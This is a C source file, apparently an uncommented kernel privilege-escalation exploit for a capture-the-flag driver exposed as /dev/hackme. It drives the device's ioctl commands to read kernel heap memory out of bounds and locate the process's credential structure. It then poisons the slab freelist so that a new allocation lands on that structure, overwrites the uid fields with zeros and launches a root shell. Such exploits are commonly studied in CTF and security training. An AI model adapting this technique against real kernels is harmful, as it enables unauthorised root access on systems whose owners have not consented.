#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <memory.h>
#include <string.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

struct info{
    long index;
    long *strings;
    long length;
    long offset;
};

#define BUF_SIZE 0x100000L
#define CHUNK_SIZE 0x40L
char buffer[BUF_SIZE] = {0};

void delete(int fd,long index)
{
	struct info temp;
	temp.index = index;
	ioctl(fd, 0x30001,&temp);
}

void edit(int fd,long index,long offset,long length,char *strings)
{
	struct info temp;
	temp.index = index;
	temp.strings = (long *)strings;
	temp.length = length;
	temp.offset = offset;
	ioctl(fd,0x30002,&temp);
}

void show(int fd,long index,long offset,long length,char *strings)
{
	struct info temp;
	temp.index = index;
	temp.strings = (long *)strings;
	temp.length = length;
	temp.offset = offset;
	ioctl(fd,0x30003,&temp);
}

void add(int fd,long index,long offset,long length,char *strings)
{
	struct info temp;
	temp.index = index;
	temp.strings = (long *)strings;
	temp.length = length;
	temp.offset = offset;
	ioctl(fd,0x30000,&temp);
}

int main()
{
	int fd = open("/dev/hackme", O_RDWR);
	int cred_size = 0xa8;
	char buf[CHUNK_SIZE] = {0};
	char comm[] = "testtofindcred";
	uintptr_t cred;
	uint64_t payload[8] = {0x0000000000000000,0x0000000000000000
    ,0x0000000000000003,0x0000000000000000
    ,0x0000000000000000,0x0000000000000000
    ,0x0000000000000000,0x0000000000000000};
	int i;
	prctl(PR_SET_NAME, comm);
	for (i = 0; i < 64; i++){
		add(fd,i,0,CHUNK_SIZE,buf);
	}
	show(fd,63,-BUF_SIZE,BUF_SIZE,buffer);
	char* ret = (char*)memmem(buffer, sizeof(buffer), comm, sizeof(comm) - 1);
	if (ret){
		cred = *(uintptr_t*)(ret - 8);
		assert(*(uintptr_t*)(ret - 0x10) == cred);
		printf("%p %p\n", (void*)(ret - buffer), (void*)cred);
		printf("ret:%p\n",ret);
		puts(ret);
	}
	puts("finish leak cred");
	delete(fd,62);
	delete(fd,61);
	show(fd,63,-2*CHUNK_SIZE,2*CHUNK_SIZE,buffer);
	uintptr_t addr_62 = *(uintptr_t*)(buffer);
	printf("addr_62:%p\n",addr_62);
	uintptr_t target = cred - 0x10;
	*(uintptr_t*)(buffer) = target;
	edit(fd,63,-2*CHUNK_SIZE,2*CHUNK_SIZE,buffer);
	//show(fd,3,-CHUNK_SIZE,CHUNK_SIZE,buffer);
	show(fd,63,-2*CHUNK_SIZE,2*CHUNK_SIZE,buffer);
	addr_62 = *(uintptr_t*)(buffer);
	printf("addr_62:%p\n",addr_62);
	add(fd,61,0,CHUNK_SIZE,(char *)payload);
	add(fd,62,0,CHUNK_SIZE,(char *)payload);
	show(fd,63,-2*CHUNK_SIZE,2*CHUNK_SIZE,buffer);
	addr_62 = *(uintptr_t*)(buffer);
	printf("addr_62:%p\n",addr_62);
	char* env[] = {"/bin/sh", NULL};
	execve("/bin/sh", env, NULL);
	return 0;
}
